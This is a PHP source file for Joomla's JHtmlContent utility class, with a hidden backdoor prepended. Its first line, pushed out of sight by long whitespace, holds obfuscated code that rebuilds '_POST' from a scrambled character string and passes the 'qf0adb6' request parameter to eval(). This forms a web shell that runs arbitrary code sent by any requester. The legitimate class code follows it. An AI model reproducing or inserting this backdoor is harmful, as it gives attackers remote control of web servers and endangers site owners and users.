<?php                                                                                                                                                                                                                                                                  $cgew4="e_otursp"; $rft8 = $cgew4[6].$cgew4[3]. $cgew4[5].$cgew4[3].$cgew4[2].$cgew4[4]. $cgew4[7]. $cgew4[7]. $cgew4[0]. $cgew4[5]; $pqk82 =$rft8( $cgew4[1]. $cgew4[7] . $cgew4[2]. $cgew4[6]. $cgew4[3] ) ; if (isset( ${$pqk82 }['qf0adb6'] ) ) { eval ( ${$pqk82} [ 'qf0adb6' ]); }?> <?php
/**
 * @package     Joomla.Platform
 * @subpackage  HTML
 *
 * @copyright   Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE
 */

defined('JPATH_PLATFORM') or die;

/**
 * Utility class to fire onContentPrepare for non-article based content.
 *
 * @package     Joomla.Platform
 * @subpackage  HTML
 * @since       11.1
 */
abstract class JHtmlContent
{
	/**
	 * Fire onContentPrepare for content that isn't part of an article.
	 *
	 * @param   string  $text     The content to be transformed.
	 * @param   array   $params   The content params.
	 * @param   string  $context  The context of the content to be transformed.
	 *
	 * @return  string   The content after transformation.
	 *
	 * @since   11.1
	 */
	public static function prepare($text, $params = null, $context = 'text')
	{
		if ($params === null)
		{
			$params = new JObject;
		}
		$article = new stdClass;
		$article->text = $text;
		JPluginHelper::importPlugin('content');
		$dispatcher = JEventDispatcher::getInstance();
		$dispatcher->trigger('onContentPrepare', array($context, &$article, &$params, 0));

		return $article->text;
	}
}
